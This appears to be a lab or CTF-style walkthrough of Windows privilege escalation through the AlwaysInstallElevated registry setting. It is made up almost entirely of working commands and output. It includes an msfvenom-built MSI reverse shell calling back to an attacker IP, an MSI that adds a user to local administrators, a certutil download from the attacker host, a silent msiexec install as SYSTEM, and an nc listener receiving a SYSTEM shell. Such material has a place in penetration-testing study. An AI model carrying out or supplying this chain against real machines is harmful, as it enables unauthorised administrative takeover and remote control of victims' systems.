### Initial Access
```
# Got shell as low-priv user
whoami
# target\lowuser

# Check privileges
whoami /priv
# SeImpersonatePrivilege Enabled
# SeChangeNotifyPrivilege Enabled
```

#### Check AlwaysInstallElevated
```
# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1
# Both set to 1 - vulnerable!
```

#### Generate MSI Payload
```
# Create MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4445 -f msi -o shell.msi

# Or with custom command
msfvenom -p windows/exec CMD="net localgroup administrators lowuser /add" -f msi -o privesc.msi
```

#### Execute MSI
```
# Upload MSI to target
certutil -urlcache -f http://10.10.14.5/shell.msi shell.msi

# Install as SYSTEM
msiexec /quiet /qn /i shell.msi
```

#### Get SYSTEM Shell
```
# On attacker
nc -lvnp 4445
# Microsoft Windows [Version 10.0.17763]
# C:\Windows\system32> whoami
# nt authority\system

# Check admin group
net localgroup administrators
# lowuser is now in administrators group
```

